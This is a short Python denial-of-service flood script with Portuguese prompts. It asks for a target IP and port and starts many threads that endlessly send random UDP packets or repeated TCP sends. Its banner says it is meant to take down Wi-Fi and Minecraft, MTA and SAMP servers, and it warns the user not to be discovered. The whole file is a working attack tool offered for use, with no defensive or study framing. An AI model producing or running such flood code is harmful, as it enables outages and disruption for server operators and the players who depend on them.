#!/usr/bin/env python3
#Code by adrian
#Codigo melhorado 2x por adrian
import sys
import os
import time
import random
import socket
import threading
#Codigo do Tempoo
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

os.system("Script Installed com sucesso")
print("")
print(" ===BY ADRIAN SCRIPT DE PACKET CRIADO PARA DERRUBAR/WIF/SERVIDORES DE MINECRAFT,MTA,SAMP,ETC!=== ")
print("CUIDADO PARA NAO SER DESCOBERTO!")
print("SCRIPT INOVADOR!")
ip = str(input(" COLQUE O IP AQUI!:"))
port = int(input(" COLQUE A PORTA AQUI!:"))
print("")
choice = str(input("POTENCIA(y/n):"))
ddos = str(input(" POTENCIA2(y/n):"))
print("")
times = int(input(" NUMEROS DE PACOTE!:"))
threads = int(input(" NUMERO DE PACOTE2:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(" NUMEROS DE PACOTES ENVIADO")
			print("")
		except:
			print("DDoS/Packet ERROR")
			print("The attack failed")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(" NUMERO DE PACOTES ENVIADO")
			print("")
		except:
			s.close()
			print("DDoS/Packet ERRO AO ENVIAR!")
			print("The attack failed")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
